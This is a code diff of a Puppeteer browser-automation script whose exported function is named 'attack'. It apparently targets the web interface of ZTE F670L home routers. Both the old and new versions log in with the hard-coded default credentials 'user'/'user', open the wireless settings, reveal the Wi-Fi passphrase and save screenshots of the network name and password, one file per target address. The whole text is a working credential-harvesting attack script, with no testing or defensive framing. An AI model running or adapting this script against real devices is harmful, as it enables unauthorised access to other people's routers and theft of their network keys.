@@ -1,49 +1,48 @@
-export default async function attackF670L(page, endereco) {
-    {
-        await page.focus("#Frm_Username");
-        await page.keyboard.type("user");
-    }
-    {
-        await page.focus("#Frm_Password");
-        await page.keyboard.type("user");
-    }
-    {
-        await page.click("#LoginId")
-    }
-    {
-        await page.waitForTimeout(5000)
-        const frame = page.frames()
-            .filter(frame => frame.url().includes("template") || frame.url().includes("getpage"))[0]
+const defaultUsername = "user";
+const defaultPassword = "user";
 
-        await page.waitForTimeout(500);
-        await frame.click("#mmNet");
+export default async function attack(page, endereco) {
 
-        await page.waitForTimeout(500);
-        await frame.click("#smWLANONE")
+    await page.focus("#Frm_Username");
+    await page.keyboard.type(defaultUsername);
+    await page.focus("#Frm_Password");
+    await page.keyboard.type(defaultPassword);
+    await page.click("#LoginId");
 
-        await page.waitForTimeout(500);
-        await frame.click("#ssmWLANMul1")
+    const frame = await page.waitForFrame(frame => {
+        return frame.url().includes("template") || frame.url().includes("getpage")
+    }, {
+        timeout: 5000
+    });
 
-        await page.waitForTimeout(500);
-        const enderecoUrlFoto = endereco
-            .replace("http://", "");
+    await (await frame.waitForSelector("#mmNet", {
+        timeout: 2000
+    })).click();
 
-        await page.screenshot({
-            path: `./fotos/${enderecoUrlFoto}-ssid.png`,
-            fullPage: true
-        });
+    await (await frame.waitForSelector("#smWLANONE", {
+        timeout: 2000
+    })).click();
 
-        await page.waitForTimeout(500);
-        await frame.click("#ssmWLANSec1");
+    await (await frame.waitForSelector("#ssmWLANMul1", {
+        timeout: 2000
+    })).click();
 
+    await page.screenshot({
+        path: `./fotos/${endereco}-1.png`,
+        fullPage: true
+    });
 
-        await page.waitForTimeout(500);
-        await frame.click("#Frm_ShowKeyPassphrase");
+    await (await frame.waitForSelector("#ssmWLANSec1", {
+        timeout: 2000
+    })).click();
 
-        await page.waitForTimeout(500);
-        await page.screenshot({
-            path: `./fotos/${enderecoUrlFoto}-password.png`,
-            fullPage: true
-        });
-    }
+    await (await frame.waitForSelector("#Frm_ShowKeyPassphrase", {
+        timeout: 2000
+    })).click();
+
+    await page.screenshot({
+        path: `./fotos/${endereco}-2.png`,
+        fullPage: true
+    });
+
 }
